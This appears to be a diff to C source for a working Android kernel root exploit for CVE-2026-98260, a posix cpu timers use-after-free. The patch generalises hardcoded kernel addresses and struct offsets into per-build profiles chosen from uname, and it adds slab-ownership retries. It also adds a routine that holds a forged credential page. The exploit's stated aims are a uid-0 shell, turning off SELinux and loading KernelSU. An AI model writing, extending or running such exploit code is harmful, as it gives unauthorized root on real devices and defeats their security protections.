@@ -1,14 +1,12 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : OnePlus PLZ110 (SM8850 / canoe), Android 17
- * Kernel : 6.12.69-android16-6-g242e1a07f878-ab15865446-4k
- * SELinux: Enforcing
- * Patches: absent
+ * Kernels: timer/kbuilds/ (indexed by timer/kbuilds.h), picked from uname -r
  * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
  *
  * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
- * The trigger, slab layout and offsets are the same; the do_timer_create
- * call site and the tracefs event ids are per-build and are re-derived here.
+ * The trigger and slab layout are the same; per-build trace call sites, data
+ * symbols and BTF offsets live in timer/kbuilds/, and the tracefs event ids
+ * are discovered at runtime.
  *
  * Two endgames:
  *
@@ -53,6 +51,8 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 
+#include "kbuilds.h"
+
 #define TR "/sys/kernel/tracing"
 #define CPU_TRIG 2
 #define NTIMERS 4096
@@ -63,32 +63,33 @@
 #define LOCKERS 3
 #define PAGE 4096UL
 #define SOCKBUF 8192
+/* task_struct_cachep allocation size seen on some point releases of this
+ * family where the allocator reports 0x1440 rounded up; accepted next to the
+ * profile's BTF size. */
+#define TASK_ALLOC_ALT 0x1640ULL
 
-/* do_timer_create+0x94 in the PLZ110 6.12.69 GKI image (BTF/disasm). */
-#define STATIC_TIMER_SITE 0xffffffc0803718f4ULL
-#define TIMER_SITE_LOW21 0x1718f4ULL
-#define TIMER_ALLOC 0x100ULL
+/* Per-build values (trace anchors, link-time data symbols, BTF layout, SLUB
+ * sizes) live in kbuilds.h and are selected from `uname -r` at startup. */
+static const struct kbuild *g_kbuild;
 
-/* cred_jar: sizeof(struct cred) and the kmem_cache_alloc bytes_alloc. */
-#define CRED_REQ 0xb8ULL
-#define CRED_ALLOC 0xc0ULL
+#define STATIC_TIMER_SITE (g_kbuild->static_timer_site)
+#define TIMER_SITE_LOW21 (g_kbuild->timer_site_low21)
+#define COPY_PROCESS_LOW21 (g_kbuild->copy_process_low21)
+#define SELINUX_STATE_STATIC (g_kbuild->selinux_state)
+#define PANIC_ON_WARN_STATIC (g_kbuild->panic_on_warn)
+#define ROOT_USER_STATIC (g_kbuild->root_user)
+#define INIT_USER_NS_STATIC (g_kbuild->init_user_ns)
+#define INIT_UCOUNTS_STATIC (g_kbuild->init_ucounts)
+#define INIT_GROUPS_STATIC (g_kbuild->init_groups)
+#define OFF_TASK_CRED (g_kbuild->off_task_cred)
+#define CRED_UID_OFF (g_kbuild->cred_uid_off)
+#define CRED_REQ (g_kbuild->cred_req)
+#define CRED_ALLOC (g_kbuild->cred_alloc)
+#define TIMER_ALLOC (g_kbuild->timer_alloc)
+#define TASK_ALLOC_BYTES (g_kbuild->task_alloc_bytes)
 
-/* PLZ110 6.12.69 link-time addresses (kallsyms) and BTF field offsets. */
-#define SELINUX_STATE_STATIC 0xffffffc082888890ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc0825dade0ULL
-#define CRED_UID_OFF 0x8ULL
-
-/* task_struct / cred layout on PLZ110 6.12.69 (BTF). */
-#define OFF_TASK_CRED 0x900ULL
-#define COPY_PROCESS_LOW21 0xe94a4ULL
-#define TASK_ALLOC_BYTES 0x1440ULL
+/* Kernel-independent. */
 #define FULLCAP 0x1ffffffffffULL
-
-/* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc082602170ULL
-#define INIT_USER_NS_STATIC 0xffffffc082601ef8ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc082603b08ULL
-#define INIT_GROUPS_STATIC 0xffffffc082603638ULL
 #define SELINUX_BLOB_OFF 0x8ULL
 #define SELINUX_SID_KERNEL 1U
 
@@ -314,9 +315,8 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
         alloc = u64(b, i + 24);
         if (!is_kernel_ptr(ptr))
             continue;
-        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
         if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
-            req != 0x1640 && alloc != 0x1640)
+            req != TASK_ALLOC_ALT && alloc != TASK_ALLOC_ALT)
             continue;
         *out = ptr;
         found++;
@@ -818,6 +818,16 @@ static void park_forever(const char *why)
         pause();
 }
 
+/* Success path for `fake`: the parked process keeps the reclaimed page alive
+ * so the child's fake cred stays valid; a reboot is the cleanup. */
+static void hold_forever(void)
+{
+    logf("[+] done; fake cred page held by this process, reboot to clean\n");
+    fflush(stdout);
+    for (;;)
+        pause();
+}
+
 /*
  * Stale timer node layout inside the reclaimed order-1 page.
  *   zero: parent=0 -> rb_erase writes 0 to target.
@@ -1163,6 +1173,22 @@ static void run_plant(unsigned long long target, int tag, int mode,
     for (int i = 0; i < nkeep; i++)
         if ((kept[i] & ~0x1fffULL) == vslab)
             slab_own++;
+    /*
+     * The victim slab must be ours end to end: a single foreign k_itimer in
+     * the same 8 KiB page keeps it off the buddy list forever, so the burst
+     * can never see it (free_seen=0).  Draw again instead of racing a page
+     * that cannot free.
+     */
+    if (slab_own < (int)(0x2000 / TIMER_ALLOC))
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim slab shared (%d/%d own); retryable\n",
+             tag, slab_own, (int)(0x2000 / TIMER_ALLOC));
+        res->retry = 1;
+        return;
+    }
     pfn = (V - g_base) >> 12;
     slab_pfn = pfn & ~1ULL;
     g_slide = site0 - STATIC_TIMER_SITE;
@@ -1367,8 +1393,10 @@ static void run_plant(unsigned long long target, int tag, int mode,
          tag, free_seen, hit, now_ms() - t1);
     if (!hit)
     {
-        logf("[-] plant%d burst missed; holding zombie\n", tag);
+        logf("[-] plant%d burst missed; holding zombie, retryable\n", tag);
         g_held++;
+        res->retry = 1;
+        free(payload);
         return;
     }
 
@@ -1608,8 +1636,27 @@ int main(int argc, char **argv)
 {
     unsigned char *raw;
     int shell_mode = 0, leak_only = 0, ids_only = 0;
+    char release[128] = {0};
 
     setvbuf(stdout, NULL, _IONBF, 0);
+
+    g_kbuild = kbuild_current(release, sizeof(release));
+    if (!g_kbuild)
+    {
+        logf("[-] unsupported kernel: %s\n",
+             release[0] ? release : "(uname failed)");
+        logf("[-] known builds:\n");
+        kbuild_print_supported(stdout);
+        return 1;
+    }
+    if (argc > 1 && !strcmp(argv[1], "build"))
+    {
+        logf("[+] running kernel: %s\n", release);
+        kbuild_dump(g_kbuild, stdout);
+        return 0;
+    }
+    logf("[+] build %s\n", release);
+
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
 
@@ -1706,9 +1753,9 @@ int main(int argc, char **argv)
             park_forever("child task not leaked");
         memset(&fc, 0, sizeof(fc));
         /*
-         * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
-         * panic_on_warn is 0.  The sysctl is only readable after SELinux is
-         * off, so the WARN cannot be gated before this plant.
+         * The self-parent erase takes the RB_EMPTY_NODE WARN; the target
+         * kernel keeps panic_on_warn at 0.  The sysctl is only readable after
+         * SELinux is off, so the WARN cannot be gated before this plant.
          *
          * Point task->cred at the reclaimed page.  The fake cred starts at
          * the stale node address; rb_erase dirties uid/gid with the target,
@@ -1768,7 +1815,7 @@ int main(int argc, char **argv)
             logf("[+] child exit status=%#x\n", st);
     }
     if (g_fake_stage)
-        park_forever("fake cred page held; reboot to clean");
+        hold_forever();
     if (g_held)
         park_forever("root shell finished; failed-plant zombies are held");
     logf("[+] done\n");
